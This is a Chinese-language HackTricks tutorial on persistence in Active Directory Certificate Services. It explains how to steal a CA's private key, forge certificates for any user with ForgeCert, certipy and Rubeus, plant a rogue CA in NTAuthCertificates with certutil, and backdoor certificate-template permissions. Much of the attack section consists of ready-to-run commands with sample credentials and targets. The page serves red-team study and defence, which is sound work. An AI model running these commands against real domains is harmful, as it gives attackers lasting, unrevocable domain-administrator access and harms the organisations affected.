# AD CS 域持久性

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您希望在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF 版本**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFT 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

## 使用被盗 CA 证书伪造证书 - DPERSIST1

如何判断一个证书是 CA 证书？

* CA 证书存在于 **CA 服务器本身**，其 **私钥受机器 DPAPI 保护**（除非操作系统使用 TPM/HSM/其他硬件进行保护）。
* 证书的 **颁发者** 和 **主题** 都设置为 **CA 的独特名称**。
* CA 证书（仅限 CA 证书）**具有“CA 版本”扩展**。
* 没有 EKUs

在 CA 服务器上使用 `certsrv.msc` 是支持的内置 GUI 方式来 **提取此证书私钥**。\
然而，这个证书与系统中存储的其他证书**没有区别**，所以例如查看 [**THEFT2 技术**](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) 来了解如何 **提取** 它们。

您也可以使用 [**certipy**](https://github.com/ly4k/Certipy) 获取证书和私钥：
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
一旦你拥有了带有私钥的 **CA cert** `.pfx` 格式，你可以使用 [**ForgeCert**](https://github.com/GhostPack/ForgeCert) 来创建有效的证书：
```bash
# Create new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Create new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Use new certificate with Rubeus to authenticate
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# User new certi with certipy to authenticate
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
{% hint style="warning" %}
**注意**：伪造证书时指定的**用户**必须在AD中是**活跃/启用**状态，并且**能够认证**，因为仍将发生以该用户身份的认证交换。例如，尝试为krbtgt账户伪造证书将不起作用。
{% endhint %}

这个伪造的证书将在指定的结束日期之前是**有效的**，并且只要根CA证书有效（通常为5到**10+年**），它就是有效的。它对**机器**也是有效的，所以结合**S4U2Self**，攻击者可以在CA证书有效期内**在任何域机器上维持持久性**。\
此外，使用此方法**生成的证书无法被撤销**，因为CA并不知道它们的存在。

## 信任恶意CA证书 - DPERSIST2

对象`NTAuthCertificates`在其`cacertificate`**属性**中定义了一个或多个**CA证书**，AD在认证过程中使用它：在认证过程中，**域控制器**检查**`NTAuthCertificates`**对象是否**包含**认证中使用的**证书的**颁发者字段中指定的**CA**的条目。如果**包含**，则认证**继续进行**。

攻击者可以生成一个**自签名CA证书**并将其**添加**到**`NTAuthCertificates`**对象中。如果攻击者对**`NTAuthCertificates`** AD对象有**控制权**（在默认配置中，只有**企业管理员**组成员以及**森林根域**中的**域管理员**或**管理员**有这些权限），他们就可以这样做。拥有高级访问权限的人可以使用`certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA126`，或使用[**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool)从任何系统**编辑** **`NTAuthCertificates`**对象。&#x20;

指定的证书应该可以**与之前详细描述的ForgeCert伪造方法一起使用**，以按需生成证书。

## 恶意配置错误 - DPERSIST3

通过修改AD CS组件的**安全描述符**，为**持久性**提供了大量机会。在“[域提升](domain-escalation.md)”部分描述的任何场景都可以被拥有高级访问权限的攻击者恶意实施，以及向敏感组件添加“控制权”（例如，WriteOwner/WriteDACL等）。这包括：

* **CA服务器的AD计算机**对象
* **CA服务器的RPC/DCOM服务器**
* **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** 容器中的任何**后代AD对象或容器**（例如，证书模板容器，认证机构容器，NTAuthCertificates对象等）
* **默认情况下或由当前组织委派控制AD CS的AD组**（例如，内置的Cert Publishers组及其任何成员）

例如，一个在域中拥有**高级权限**的攻击者可以向默认的**`User`**证书模板添加**`WriteOwner`**权限，其中攻击者是该权利的主体。为了在以后滥用这一点，攻击者首先将**`User`**模板的所有权修改为自己，然后将模板上的**`mspki-certificate-name-flag`**设置为**1**，以启用**`ENROLLEE_SUPPLIES_SUBJECT`**（即，允许用户在请求中提供一个主题备用名称）。然后，攻击者可以**注册**该**模板**，指定一个**域管理员**名称作为备用名称，并使用结果证书作为DA进行认证。

## 参考资料

* 本页的所有信息取自 [https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf)

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零到英雄学习AWS hacking！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks**中看到您的**公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来**分享您的黑客技巧**。

</details>
